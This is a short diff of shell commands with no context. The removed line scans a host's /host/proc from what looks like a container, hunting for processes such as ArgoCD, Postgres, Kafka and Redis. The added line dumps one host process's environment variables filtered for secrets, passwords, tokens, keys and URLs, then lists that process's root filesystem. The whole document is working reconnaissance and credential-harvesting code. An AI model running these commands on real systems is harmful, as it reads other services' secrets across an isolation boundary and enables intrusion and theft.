@@ -1,1 +1,1 @@
-for pid in $(ls /host/proc | grep -E "^[0-9]+$" | head -120); do cmd=$(cat /host/proc/$pid/cmdline 2>/dev/null | tr "\0" " " | cut -c1-60); case "$cmd" in *superset*|*clickhouse*|*argocd*|*postgres*|*kafka*|*redis*|*crm*|*api*) echo "PID $pid: $cmd";; esac; done 2>/dev/null | head -20
+R=/host/proc/156886/root; cat /host/proc/156886/environ 2>/dev/null | tr "\0" "\n" | grep -iE "secret|pass|token|key|url" | head -15; echo "=== FS ==="; ls $R/app 2>/dev/null | head; ls $R/ 2>/dev/null | head -15; ls $R/argo-cd 2>/dev/null | head -10
